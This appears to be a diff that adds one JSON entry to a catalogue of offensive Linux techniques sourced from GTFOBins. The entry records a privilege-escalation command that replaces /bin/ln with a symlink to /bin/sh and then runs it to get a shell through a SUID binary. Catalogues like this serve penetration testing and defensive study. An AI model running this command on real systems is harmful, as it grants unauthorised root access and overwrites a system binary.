@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-ln-privilege-escalation",
+  "name": "GTFOBins · ln (privilege-escalation)",
+  "command": "ln -fs /bin/sh /bin/ln\nln",
+  "description": "Use ln to privilege escalation via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "ln",
+    "privilege-escalation"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/ln/#privilege-escalation",
+  "upstream_id": "ln/privilege-escalation/0",
+  "category": "gtfobins",
+  "subcategory": "suid",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/ln/"
+    }
+  ]
+}
